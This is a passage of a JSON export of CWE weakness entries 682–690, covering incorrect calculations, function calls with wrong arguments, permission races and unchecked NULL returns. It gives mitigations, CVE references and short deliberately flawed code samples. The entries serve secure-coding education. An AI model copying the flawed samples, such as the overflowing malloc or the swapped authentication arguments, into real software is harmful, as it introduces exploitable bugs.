{
  "Weaknesses": [
    {
      "ID": "682",
      "Name": "Incorrect Calculation",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product performs a calculation that generates incorrect or unintended results that are later used in security-critical decisions or resource management.",
      "ExtendedDescription": "When product performs a security-critical calculation incorrectly, it might lead to incorrect resource allocations, incorrect privilege assignments, or failed comparisons among other things. Many of the direct results of an incorrect calculation can lead to even larger problems such as failed protection mechanisms or even arbitrary code execution.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "CanPrecede",
          "CweID": "170",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the incorrect calculation causes the program to move into an unexpected state, it may lead to a crash or impairment of service."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "DoS: Resource Consumption (Other)",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If the incorrect calculation is used in the context of resource allocation, it could lead to an out-of-bounds operation (CWE-119) leading to a crash or even arbitrary code execution. Alternatively, it may result in an integer overflow (CWE-190) and / or a resource consumption problem (CWE-400)."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "In the context of privilege or permissions assignment, an incorrect calculation can provide an attacker with access to sensitive resources."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "If the incorrect calculation leads to an insufficient comparison (CWE-697), it may compromise a protection mechanism such as a validation routine and allow an attacker to bypass the security-critical code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-7",
          "Method": "Manual Analysis",
          "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.\n",
          "Effectiveness": "High",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Understand your programming language's underlying representation and how it interacts with numeric calculation. Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, \"not-a-number\" calculations, and how your language handles numbers that are too large or too small for its underlying representation."
        },
        {
          "MitigationID": "MIT-8",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.\n\n\nExamples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.\n\n\nExamples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).\n"
        },
        {
          "MitigationID": "MIT-26",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Compilation or Build Hardening",
          "Description": "Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-33",
          "Entries": [
            {
              "IntroText": "The following image processing code allocates a table for images."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\timg_t table_ptr; /*struct containing img data, 10kB each*/\n\tint num_imgs;\n\t...\n\tnum_imgs = get_num_imgs();\n\ttable_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);\n\t...\n```"
            },
            {
              "BodyText": "This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119)."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This code attempts to calculate a football team's average number of yards gained per touchdown."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\tint touchdowns = team.getTouchdowns();\n\tint yardsGained = team.getTotalYardage();\n\tSystem.out.println(team.getName() + \" averages \" + yardsGained / touchdowns + \"yards gained for every touchdown scored\");\n\t...\n```"
            },
            {
              "BodyText": "The code does not consider the event that the team they are querying has not scored a touchdown, but has gained yardage. In that case, we should expect an ArithmeticException to be thrown by the JVM. This could lead to a loss of availability if our error handling code is not set up correctly."
            }
          ]
        },
        {
          "ID": "DX-55",
          "Entries": [
            {
              "IntroText": "This example attempts to calculate the position of the second byte of a pointer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint *p = x;\n\tchar * second_char = (char *)(p + 1);\n```"
            },
            {
              "BodyText": "In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2020-0022",
          "Description": "chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-0022"
        },
        {
          "Reference": "CVE-2004-1363",
          "Description": "substitution overflow: buffer overflow using environment variables that are expanded after the length check is performed",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1363"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FLP32-C",
          "EntryName": "Prevent or detect domain and range errors in math functions",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT07-C",
          "EntryName": "Use only explicitly signed or unsigned char type for numeric values"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT13-C",
          "EntryName": "Use bitwise operators only on unsigned operands"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT33-C",
          "EntryName": "Ensure that division and remainder operations do not result in divide-by-zero errors",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT34-C",
          "EntryName": "Do not shift an expression by a negative number of bits or by greater than or equal  to the number of bits that exist in the operand",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "RelatedAttackPatterns": [
        "128",
        "129"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-106",
          "Authors": [
            "David LeBlanc",
            "Niels Dekker"
          ],
          "Title": "SafeInt",
          "URL": "http://safeint.codeplex.com/"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 7: Integer Overflows.\" Page 119",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Signed Integer Boundaries\", Page 220",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar. In many cases, lower-level children or descendants are more appropriate. However, sometimes this weakness is forced to be used due to the lack of in-depth weakness research. See Research Gaps.",
        "Comments": "Where feasible, consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "\n\nWeaknesses related to this Pillar appear to be under-studied, especially with respect to classification schemes. Input from academic and other communities could help identify and resolve gaps or organizational difficulties within CWE.\n"
        }
      ]
    },
    {
      "ID": "683",
      "Name": "Function Call With Incorrect Order of Arguments",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine, but the caller specifies the arguments in an incorrect order, leading to resultant weaknesses.",
      "ExtendedDescription": "While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers or types of arguments, such as format strings in C. It also can occur in languages or environments that do not enforce strong typing.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "628",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This problem typically occurs when the programmer makes a typo, or copy and paste errors."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use the function, procedure, or routine as specified."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-62",
          "Entries": [
            {
              "IntroText": "The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction authenticate($username, $password) {\n```\n// authenticate user* \n\t\t\t...}\n\t\n\tauthenticate($_POST['password'], $_POST['username']);"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-7049",
          "Description": "Application calls functions with arguments in the wrong order, allowing attacker to bypass intended access restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7049"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "684",
      "Name": "Incorrect Provision of Specified Functionality",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code does not function according to its published specifications, potentially leading to incorrect usage.",
      "ExtendedDescription": "When providing functionality to an external party, it is important that the product behaves in accordance with the details specified. When requirements of nuances are not documented, the functionality may produce unintended behaviors for the caller, possibly leading to an exploitable state.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that your code strictly conforms to specifications."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-185",
          "Entries": [
            {
              "IntroText": "In the following snippet from a doPost() servlet method, the server returns \"200 OK\" (default) even if an error occurs."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n```\n// Something that may throw an exception.* \n\t\t\t...} catch (Throwable t) {\n\t```\n\t\tlogger.error(\"Caught: \" + t.toString());\n\t\treturn;\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-186",
          "Entries": [
            {
              "IntroText": "In the following example, an HTTP 404 status code is returned in the event of an IOException encountered in a Java servlet. A 404 code is typically meant to indicate a non-existent resource and would be somewhat misleading in this case."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n```\n// something that might throw IOException* \n\t\t\t...} catch (IOException ioe) {\n\t```\n\t\tresponse.sendError(SC_NOT_FOUND);\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-1446",
          "Description": "Error checking routine in PKCS#11 library returns \"OK\" status even when invalid signature is detected, allowing spoofed messages.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1446"
        },
        {
          "Reference": "CVE-2001-1559",
          "Description": "Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1559"
        },
        {
          "Reference": "CVE-2003-0187",
          "Description": "Program uses large timeouts on unconfirmed connections resulting from inconsistency in linked lists implementations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0187"
        },
        {
          "Reference": "CVE-1999-1446",
          "Description": "UI inconsistency; visited URLs list not cleared when \"Clear History\" option is selected.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1446"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "PRE09-C",
          "EntryName": "Do not replace secure functions with less secure functions"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "685",
      "Name": "Function Call With Incorrect Number of Arguments",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine, but the caller specifies too many arguments, or too few arguments, which may lead to undefined behavior and resultant weaknesses.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "628",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This problem typically occurs when the programmer makes a typo, or copy and paste errors."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Other",
          "Description": "While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers of arguments, such as format strings in C. It also can occur in languages or environments that do not require that functions always be called with the correct number of arguments, such as Perl."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP37-C",
          "EntryName": "Call functions with the correct number and type of arguments",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO47-C",
          "EntryName": "Use valid format strings",
          "MappingFit": "Imprecise"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "686",
      "Name": "Function Call With Incorrect Argument Type",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine, but the caller specifies an argument that is the wrong data type, which may lead to resultant weaknesses.",
      "ExtendedDescription": "This weakness is most likely to occur in loosely typed languages, or in strongly typed languages in which the types of variable arguments cannot be enforced at compilation time, or where there is implicit casting.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "628",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP37-C",
          "EntryName": "Call functions with the correct number and type of arguments",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO47-C",
          "EntryName": "Use valid format strings",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "POS34-C",
          "EntryName": "Do not call putenv() with a pointer to an automatic variable as the argument"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR37-C",
          "EntryName": "Arguments to character handling functions must be representable as an unsigned char"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "687",
      "Name": "Function Call With Incorrectly Specified Argument Value",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine, but the caller specifies an argument that contains the wrong value, which may lead to resultant weaknesses.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "628",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Manual Static Analysis",
          "Description": "This might require an understanding of intended program behavior or design to determine whether the value is incorrect."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-63",
          "Entries": [
            {
              "IntroText": "This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tsub ReportAuth {\n\t\tmy ($username, $result, $fatal) = @_;\n\t\tPrintLog(\"auth: username=%s, result=%d\", $username, $result);\n\t\tif (($result ne \"success\") && $fatal) {\n\t\t\tdie \"Failed!\\n\";\n\t\t}\n\t}\n\tsub PrivilegedFunc\n\t{\n\t\tmy $result = CheckAuth($username);\n\t\tReportAuth($username, $result, 0);\n\t\tDoReallyImportantStuff();\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM04-C",
          "EntryName": "Do not perform zero length allocations"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "When primary, this weakness is most likely to occur in rarely-tested code, since the wrong value can change the semantic meaning of the program's execution and lead to obviously-incorrect behavior. It can also be resultant from issues in which the program assigns the wrong value to a variable, and that variable is later used in a function call. In that sense, this issue could be argued as having chaining relationships with many implementation errors in CWE."
        }
      ]
    },
    {
      "ID": "688",
      "Name": "Function Call With Incorrect Variable or Reference as Argument",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "628",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This problem typically occurs when the programmer makes a typo, or copy and paste errors."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Other",
          "Description": "While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers of arguments, such as format strings in C. It also can occur in loosely typed languages or environments. This might require an understanding of intended program behavior or design to determine whether the value is incorrect."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-64",
          "Entries": [
            {
              "IntroText": "In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate static final String[] ADMIN_ROLES = ...;\n\tpublic boolean void accessGranted(String resource, String user) {\n\t\tString[] userRoles = getUserRoles(user);\n\t\treturn accessGranted(resource, ADMIN_ROLES);\n\t}\n\tprivate boolean void accessGranted(String resource, String[] userRoles) {\n```\n// grant or deny access based on user roles* \n\t\t\t...}"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-2548",
          "Description": "Kernel code specifies the wrong variable in first argument, leading to resultant NULL pointer dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2548"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "689",
      "Name": "Permission Race Condition During Resource Copy",
      "Abstraction": "Compound",
      "Structure": "Composite",
      "Status": "Draft",
      "Description": "The product, while copying or cloning a resource, does not set the resource's permissions or access control until the copy is complete, leaving the resource exposed to other spheres while the copy is taking place.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "362",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "Requires",
          "CweID": "362",
          "ViewID": "1000"
        },
        {
          "Nature": "Requires",
          "CweID": "732",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "\n\nCommon examples occur in file archive extraction, in which the product begins the extraction with insecure default permissions, then only sets the final permissions (as specified in the archive) once the copy is complete. The larger the archive, the larger the timing window for the race condition.\n\n\nThis weakness has also occurred in some operating system utilities that perform copies of deeply nested directories containing a large number of files.\n\n\nThis weakness can occur in any type of functionality that involves copying objects or resources in a multi-user environment, including at the application level. For example, a document management system might allow a user to copy a private document, but if it does not set the new copy to be private as soon as the copy begins, then other users might be able to view the document while the copy is still taking place.\n"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-0760",
          "Description": "Archive extractor decompresses files with world-readable permissions, then later sets permissions to what the archive specified.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0760"
        },
        {
          "Reference": "CVE-2005-2174",
          "Description": "Product inserts a new object into database before setting the object's permissions, introducing a race condition.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2174"
        },
        {
          "Reference": "CVE-2006-5214",
          "Description": "Error file has weak permissions before a chmod is performed.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5214"
        },
        {
          "Reference": "CVE-2005-2475",
          "Description": "Archive permissions issue using hard link.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2475"
        },
        {
          "Reference": "CVE-2003-0265",
          "Description": "Database product creates files world-writable before initializing the setuid bits, leading to modification of executables.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0265"
        }
      ],
      "RelatedAttackPatterns": [
        "26",
        "27"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 9, \"Permission Races\", Page 533",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This is a Composite of multiple weaknesses that must all occur simultaneously.",
        "Comments": "While composites are supported in CWE, they have not been a focus of research. There is a chance that future research or CWE scope clarifications will change or deprecate them. Perform root-cause analysis to determine which weaknesses allow this issue to occur, and map to those weaknesses. For example, the delayed permission-setting in the resource copy might be intended functionality, but creation in a location with insecure permissions might not.",
        "Reasons": [
          "Other"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-studied. It seems likely that this weakness could occur in any situation in which a complex or large copy operation occurs, when the resource can be made available to other spheres as soon as it is created, but before its initialization is complete."
        }
      ]
    },
    {
      "ID": "690",
      "Name": "Unchecked Return Value to NULL Pointer Dereference",
      "Abstraction": "Compound",
      "Structure": "Chain",
      "Status": "Draft",
      "Description": "The product does not check for an error after calling a function that can return with a NULL pointer if the function fails, which leads to a resultant NULL pointer dereference.",
      "ExtendedDescription": "While unchecked return value weaknesses are not limited to returns of NULL pointers (see the examples in CWE-252), functions often return NULL to indicate an error status. When this error condition is not checked, a NULL pointer dereference can occur.",
      "RelatedWeaknesses": [
        {
          "Nature": "StartsWith",
          "CweID": "252",
          "ViewID": "709"
        },
        {
          "Nature": "ChildOf",
          "CweID": "252",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
